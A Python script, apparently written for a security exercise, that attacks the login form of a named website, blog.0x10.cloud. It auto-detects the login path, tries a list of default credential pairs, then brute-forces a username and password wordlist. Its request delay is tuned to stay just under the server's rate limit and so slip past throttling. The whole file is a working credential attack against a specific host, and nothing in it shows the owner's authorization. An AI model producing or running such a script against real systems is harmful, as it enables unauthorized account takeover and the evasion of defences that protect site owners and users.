# ============================================================
#  Default Credential & Brute Force Attack
#  Author: [Your Name]
#  Vulnerability: Weak/Default Credentials on Blog Login
#  Target: blog.0x10.cloud
# ============================================================
#
#  Phase 1: Try common default credential pairs
#  Phase 2: Brute force with expanded username/password lists
#
#  Stays under the 10 req/sec server rate limit using
#  time.sleep(0.15) between each request.
# ============================================================

import urllib.request
import urllib.parse
import time

TARGET = "http://blog.0x10.cloud/"
DELAY  = 0.15  # 150ms → ~6 req/sec, safely under the 10/sec limit

# ── Helpers ──────────────────────────────────────────────────

def get_login_path():
    """Try to find the login form path."""
    for path in ["/", "/login", "/admin", "/wp-login.php", "/signin"]:
        try:
            r = urllib.request.urlopen(TARGET + path, timeout=5)
            body = r.read().decode("utf-8", errors="ignore")
            if "password" in body.lower() and "username" in body.lower():
                return path
        except:
            pass
    return "/login"  # fallback


def try_login(path, username, password):
    """POST credentials, return (status_code, final_url, body)."""
    data = urllib.parse.urlencode({
        "username": username,
        "password": password
    }).encode("utf-8")

    req = urllib.request.Request(TARGET + path, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "Mozilla/5.0")

    try:
        r = urllib.request.urlopen(req, timeout=5)
        body = r.read().decode("utf-8", errors="ignore")
        return r.status, r.url, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore")
        return e.code, TARGET + path, body
    except Exception as e:
        return None, TARGET + path, str(e)


def is_success(final_url, body, original_path):
    """Detect a successful login from the response."""
    success_words = ["dashboard", "logout", "welcome", "manage", "admin panel", "signed in"]
    if any(w in body.lower() for w in success_words):
        return True
    # Redirect away from the login page = success
    if final_url and original_path not in final_url.replace(TARGET, ""):
        return True
    return False


def attempt(path, username, password, phase_label):
    status, final_url, body = try_login(path, username, password)
    marker = f"  [{phase_label}] {username}:{password}"
    print(f"{marker:<45} → {status}  {final_url}")
    if status and is_success(final_url, body, path):
        return True, body
    time.sleep(DELAY)
    return False, body

# ── Phase 1: Default credentials ─────────────────────────────

DEFAULTS = [
    ("admin",  "admin"),
    ("admin",  "password"),
    ("admin",  "1234"),
    ("admin",  "admin123"),
    ("admin",  "secret"),
    ("admin",  "letmein"),
    ("admin",  ""),
    ("root",   "root"),
    ("root",   "toor"),
    ("root",   "password"),
    ("user",   "user"),
    ("blog",   "blog"),
    ("test",   "test"),
    ("guest",  "guest"),
    ("",       ""),
]

# ── Phase 2: Brute-force wordlists ───────────────────────────

USERNAMES = [
    "admin", "administrator", "root", "user",
    "blog", "editor", "manager", "support", "test",
]

PASSWORDS = [
    "password", "123456", "12345678", "qwerty", "abc123",
    "monkey", "1234567", "letmein", "trustno1", "dragon",
    "baseball", "iloveyou", "master", "sunshine", "princess",
    "welcome", "shadow", "superman", "michael", "football",
    "admin", "admin123", "pass", "pass123", "secret",
    "changeme", "123123", "111111", "000000", "password1",
]

# ── Main ─────────────────────────────────────────────────────

print("=" * 60)
print("  Credential Attack — http://blog.0x10.cloud/")
print("=" * 60)

print("\n  [*] Auto-detecting login path...")
login_path = get_login_path()
print(f"  [*] Using login path: {login_path}")

# ── PHASE 1 ──────────────────────────────────────────────────
print(f"\n  ── PHASE 1: Default credentials ({len(DEFAULTS)} pairs) ──\n")

winner = None
for user, pwd in DEFAULTS:
    ok, body = attempt(login_path, user, pwd, "DEFAULT")
    if ok:
        winner = (user, pwd)
        break

# ── PHASE 2 (only if Phase 1 failed) ─────────────────────────
if not winner:
    total = len(USERNAMES) * len(PASSWORDS)
    print(f"\n  ── PHASE 2: Brute force ({total} combinations) ──\n")

    for user in USERNAMES:
        for pwd in PASSWORDS:
            ok, body = attempt(login_path, user, pwd, "BRUTE")
            if ok:
                winner = (user, pwd)
                break
        if winner:
            break

# ── Result ───────────────────────────────────────────────────
print("\n" + "=" * 60)
if winner:
    print(f"\n  [!] VULNERABILITY FOUND")
    print(f"  Working credentials: username='{winner[0]}' password='{winner[1]}'")
    print(f"  Target: {TARGET}{login_path}")
    print(f"\n  SECURITY RISK:")
    print(f"  The blog accepts weak/default credentials.")
    print(f"  Any attacker can log in and read, edit, or delete")
    print(f"  all blog posts without authorization.")
else:
    print("\n  [OK] No credentials found in this wordlist.")
    print("  Try inspecting the login form's field names in")
    print("  browser DevTools (Network tab → POST request)")
    print("  and adjust 'username'/'password' keys if needed.")

print("=" * 60)